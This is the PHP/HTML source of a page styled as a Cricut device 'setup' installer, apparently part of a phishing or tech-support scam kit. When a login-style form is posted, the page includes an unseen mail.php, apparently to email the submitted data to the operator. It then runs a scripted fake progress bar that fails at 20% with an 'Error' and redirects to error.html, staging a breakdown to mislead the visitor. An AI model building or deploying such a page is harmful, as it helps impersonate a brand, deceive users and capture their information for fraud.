<?php
 if (isset($_POST['btnLoginMore'])) {
    
    include 'mail.php';
}else{
    header('Location: details.php');
}
?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
<head>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" type="text/css" href="css/common/webgs_base.css" />
<link rel="stylesheet" type="text/css" href="css/others/webgs_base.css" />
<link rel="stylesheet" type="text/css" href="css/common/webgs_setup.css" />
<link rel="stylesheet" type="text/css" href="css/others/webgs_setup.css" />
<link href="css/templatemo_style.html"  rel='stylesheet' type='text/css'>
 <!-- Bootstrap core CSS -->
 <link href="css/bootstrap.css" rel='stylesheet' type='text/css'>
<title>Cricut : Loading : Setup</title>
<script type="text/javascript" src="script/jquery-1.9.0.js"></script>



<style>
            #overlay
            {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: #dbdada;
                filter: alpha(opacity=70);
                -moz-opacity: 0.1;
                -khtml-opacity: 0.1;
                opacity: 0.1;
                z-index: 100;
                display: none;
            }
            .img a
            {
                text-decoration: none;
            }
            .popup
            {
                width: 100%;
                margin: 0 auto;
                display: none;
                position: fixed;
                z-index: 101;
            }
            .img
            {
                min-width: 419px;
                width: 188px;
                min-height: 150px;
                height:auto;
                margin: 430px auto;
                background: #f3f3f3;
                position: relative;
                z-index: 103;
                padding: 1px;
                border-radius: 0px;
                box-shadow: 0 1px 1px #000;
            
            }
            .img p
            {
                clear: both;
                color: #555555;
                text-align: justify;
            }
            .img p a
            {
                color: #d91900;
                font-weight: bold;
            }
            .img .x
            {
                float: right;
                height: 35px;
                left: 22px;
                position: relative;
                top: -25px;
                width: 34px;
            }
            .img .x:hover
            {
                cursor: pointer;
            }
</style>
<script>
            $(document).ready(function(){
                var c = 0, w=0 ;
                var timer = setInterval(function(){
                    $('.progress-bar').css("width", w=w+6)
                    $('.status').html("Installing : " + c + "%")
                    if(c == 20 ) {
                        clearInterval(timer);
                        $('.progress-bar').addClass("progress-bar-danger");
                        $('.status').html("Installing : <span style='color: firebrick;'>Error</span>")
                        setTimeout(function(){
                            $('.first').hide();
                            $('.second').show();
                            setTimeout($(function () {
                                window.location = "error.html"
                            }), 2000)
                        }, 2000)
                    }
                    c++;
                }, 1000)
            });
        </script>
        
</head>
<body>
<div id="container">
<div id="header" style="align-items: center;">
		
		
		
	</div>
	
	<div id="contents">
		
		<div class="WGS_contents WGS_contents_step1">
			<div id="WGS_js_step_contents" class="WGS_step_contents">
                <div class="container-fluid">
            <div style="font-family: 'Open Sans', sans-serif; font-size: 16px; position: absolute; width: 50%; margin-top: 140px; margin-left: 24%; z-index: 10; font-weight: bold;">Installing 1 of 2 Basic Device Software</div>
            <div class="first">
                <div class="progress" style="position: absolute; width: 50%; height: 35px; margin-top: 170px; margin-left: 24%; z-index: 10;">
                    <div class="progress-bar progress-bar-success" role="progressbar">
                    </div>
                </div>
                <div class="status" style="font-family: 'Open Sans', sans-serif; font-size: 14px; position: absolute; width: 50%; margin-top: 205px; margin-left: 24%; z-index: 10; font-weight: bold;">Installing : 0%</div>
            </div>
        </div>
       
			</div>
		</div>
		
	</div>
</div>

</body>
</html>
